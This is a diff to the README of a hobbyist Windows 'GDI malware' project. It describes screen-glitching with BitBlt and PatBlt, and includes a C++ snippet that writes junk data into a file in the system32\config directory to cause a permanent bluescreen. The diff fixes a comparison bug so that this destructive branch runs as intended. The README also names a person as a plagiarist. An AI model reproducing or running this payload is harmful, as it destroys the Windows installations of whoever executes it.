@@ -1,6 +1,6 @@
 # My First-Ever GDI Malware
 ## <strong>Introduction</strong>
-This is based on my old project, `permanent-bluescreen-cpp`, which I made. This new ptoject contains the destructive payload from that project and some `BitBlt` and `PatBlt`.
+This is based on my old project, `permanent-bluescreen-cpp`, which I made. This new project contains the destructive payload from that project and uses some `BitBlt` and `PatBlt`.
 ## <strong>The GDI</strong>
 GDI means Graphics-Device Interface. It is used for glitching the screen, at least what I think. As said above, it contains  `BitBlt`  and  `PatBlt` . It uses this:
 ```cpp
@@ -13,7 +13,7 @@ This is based on a Windows 10/11 registry bug thing. If you go to `C:\Windows\sy
 ```cpp
 int bv = rand() % 2; // random number between 0 and 1, not 0 and 2
 system("cd C:\Windows\system32\config");
-if (bv = 1)
+if (bv == 1)
 {
     system("echo 5=fuf7GhI^=^=S y s^@ .B l u e s c r e e n^=^↓=3fdgh4c > OSDATA");
 }
@@ -36,6 +36,6 @@ The call of the VBS file is done by using
 ## <strong>Conclusion</strong>
 This is a malicious file. Do not run this on your own computer. Instead, run it on a virtual machine or a disposable computer. If you found yourself running the file that ran the payload, boot into Windows PE and delete the file.
 ## <strong>For the Skids</strong>
-Don't copy my project unless you credit me. Understand what you're doing. I know one of you very well, that is Pankoza. Pankoza skids other people's malware without credit and labels them as no-skid malware. I'm being honest, I used to be a big skid too and my Github username still is `the_script_kiddie` .
+Don't copy my project unless you credit me. Understand what you're doing. I know one of you very well, that is Pankoza. Pankoza skids other people's malware without credit and labels them as no-skid malware. I'm being honest, I used to be a big skid too and my Github username still is `the_script_kiddie` . Also, this is only compatible for Windows 11.
 <br><br><br>
 <small>bye!</small>
